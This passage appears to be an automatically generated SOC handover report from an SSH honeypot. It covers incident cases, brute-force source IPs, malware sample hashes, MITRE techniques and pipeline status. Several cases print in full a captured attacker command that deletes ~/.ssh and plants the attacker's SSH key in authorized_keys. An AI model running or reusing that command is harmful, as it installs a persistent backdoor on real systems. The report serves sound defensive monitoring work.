| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:52:46` | `cowrie.session.connect` |
| `2026-04-04 09:52:46` | `cowrie.client.version` |
| `2026-04-04 09:52:46` | `cowrie.client.kex` |
| `2026-04-04 09:52:46` | `cowrie.login.success` |
| `2026-04-04 09:52:46` | `cowrie.session.params` |
| `2026-04-04 09:52:46` | `cowrie.command.input` |
| `2026-04-04 09:52:46` | `cowrie.command.failed` |
| `2026-04-04 09:52:47` | `cowrie.log.closed` |
| `2026-04-04 09:52:47` | `cowrie.session.params` |
| `2026-04-04 09:52:47` | `cowrie.command.input` |
| `2026-04-04 09:52:47` | `cowrie.session.file_download` |
| `2026-04-04 09:52:47` | `cowrie.log.closed` |
| `2026-04-04 09:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd820738b03f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:52 |
| **Last Seen** | 2026-04-04 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:52:49` | `cowrie.session.connect` |
| `2026-04-04 09:52:49` | `cowrie.client.version` |
| `2026-04-04 09:52:49` | `cowrie.client.kex` |
| `2026-04-04 09:52:49` | `cowrie.login.success` |
| `2026-04-04 09:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a22adfba33

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 10:01 |
| **Last Seen** | 2026-04-04 10:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 10:01:42` | `cowrie.session.connect` |
| `2026-04-04 10:01:42` | `cowrie.client.version` |
| `2026-04-04 10:01:42` | `cowrie.client.kex` |
| `2026-04-04 10:01:43` | `cowrie.login.success` |
| `2026-04-04 10:01:43` | `cowrie.session.params` |
| `2026-04-04 10:01:43` | `cowrie.command.input` |
| `2026-04-04 10:01:43` | `cowrie.command.failed` |
| `2026-04-04 10:01:43` | `cowrie.log.closed` |
| `2026-04-04 10:01:43` | `cowrie.session.params` |
| `2026-04-04 10:01:43` | `cowrie.command.input` |
| `2026-04-04 10:01:43` | `cowrie.session.file_download` |
| `2026-04-04 10:01:43` | `cowrie.log.closed` |
| `2026-04-04 10:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ebc5a25273

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 10:01 |
| **Last Seen** | 2026-04-04 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 10:01:45` | `cowrie.session.connect` |
| `2026-04-04 10:01:45` | `cowrie.client.version` |
| `2026-04-04 10:01:45` | `cowrie.client.kex` |
| `2026-04-04 10:01:46` | `cowrie.login.success` |
| `2026-04-04 10:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc77bb006702

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-04-04 10:13 |
| **Last Seen** | 2026-04-04 10:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 10:13:03` | `cowrie.session.connect` |
| `2026-04-04 10:13:03` | `cowrie.client.version` |
| `2026-04-04 10:13:03` | `cowrie.client.kex` |
| `2026-04-04 10:13:03` | `cowrie.login.success` |
| `2026-04-04 10:13:03` | `cowrie.session.params` |
| `2026-04-04 10:13:03` | `cowrie.command.input` |
| `2026-04-04 10:13:03` | `cowrie.command.failed` |
| `2026-04-04 10:13:03` | `cowrie.log.closed` |
| `2026-04-04 10:13:03` | `cowrie.session.params` |
| `2026-04-04 10:13:03` | `cowrie.command.input` |
| `2026-04-04 10:13:03` | `cowrie.session.file_download` |
| `2026-04-04 10:13:03` | `cowrie.log.closed` |
| `2026-04-04 10:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af5bb5fa912

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-04-04 10:13 |
| **Last Seen** | 2026-04-04 10:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 10:13:05` | `cowrie.session.connect` |
| `2026-04-04 10:13:05` | `cowrie.client.version` |
| `2026-04-04 10:13:05` | `cowrie.client.kex` |
| `2026-04-04 10:13:05` | `cowrie.login.success` |
| `2026-04-04 10:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `213.225.8[.]230` | **24** | 2026-04-04 08:39 | 2026-04-04 09:36 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.33[.]81` | **22** | 2026-04-04 09:11 | 2026-04-04 10:01 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.20.122[.]54` | **6** | 2026-04-04 09:15 | 2026-04-04 10:13 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `202.125.94[.]71` | **4** | 2026-04-04 09:10 | 2026-04-04 09:18 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `79.45.101[.]239` | **4** | 2026-04-04 09:15 | 2026-04-04 09:22 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `49.64.86[.]110` | **3** | 2026-04-04 08:38 | 2026-04-04 08:41 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.58.213[.]160` | **2** | 2026-04-04 09:07 | 2026-04-04 09:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `125.19.156[.]30` | 1 | 2026-04-04 08:58 | 2026-04-04 08:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `149.75.185[.]190` | 1 | 2026-04-04 08:39 | 2026-04-04 08:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.217.70[.]151` | 1 | 2026-04-04 09:13 | 2026-04-04 09:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.94.74[.]82` | 1 | 2026-04-04 10:15 | 2026-04-04 10:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.104.220[.]84` | 1 | 2026-04-04 09:11 | 2026-04-04 09:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-04-04 10:22 | 2026-04-04 10:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.189.253[.]198` | 1 | 2026-04-04 09:50 | 2026-04-04 09:50 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.194[.]124` | 1 | 2026-04-04 08:54 | 2026-04-04 08:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.102[.]122` | 1 | 2026-04-04 09:31 | 2026-04-04 09:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `61.2.44[.]54` | 1 | 2026-04-04 09:18 | 2026-04-04 09:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.174[.]63` | 1 | 2026-04-04 10:28 | 2026-04-04 10:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.193.122[.]91` | 1 | 2026-04-04 08:52 | 2026-04-04 08:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.113.167[.]222` | 1 | 2026-04-04 09:37 | 2026-04-04 09:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 35/100 | 🟢 LOW | **15/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `60.167.19[.]189` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `183.171.11[.]79` | MY | Celcom Axiata Berhad | **100** ⚠️ | 17 |
| `180.94.74[.]82` | AF | GCN/DCN Networks | **100** ⚠️ | 39 |
| `183.104.220[.]84` | KR | Korea Telecom | **100** ⚠️ | 33 |
| `97.113.167[.]222` | US | CenturyLink Communications, LLC | **100** ⚠️ | 8 |
| `125.19.156[.]30` | IN | Bharti Televentures Ltd. - ABTS | **100** ⚠️ | 33 |
| `171.217.70[.]151` | CN | CHINANET Sichuan province network | **100** ⚠️ | 44 |
| `220.246.194[.]124` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 10 |
| `65.20.174[.]63` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `186.222.55[.]187` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 126 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 74 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 49 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 157 cases |
| Tool 34  | Credential Extractor        | ✅ 123 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (19.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 49 priority case(s) shown individually · 20 recon entry/entries in table (7 group(s) consolidating 65 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-04T10:31:54Z_
